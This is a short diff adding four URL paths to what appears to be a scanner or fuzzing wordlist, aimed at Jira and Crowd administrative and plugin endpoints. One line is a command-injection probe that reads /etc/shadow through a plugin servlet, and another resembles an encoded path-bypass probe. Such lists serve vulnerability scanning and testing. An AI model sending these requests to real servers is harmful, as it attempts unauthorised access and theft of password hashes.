@@ -1,0 +1,4 @@
+/secure/ContactAdministrators!default.jspa
+/InsightPluginShowGeneralConfiguration.jspa;
+/admin%20/db
+/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
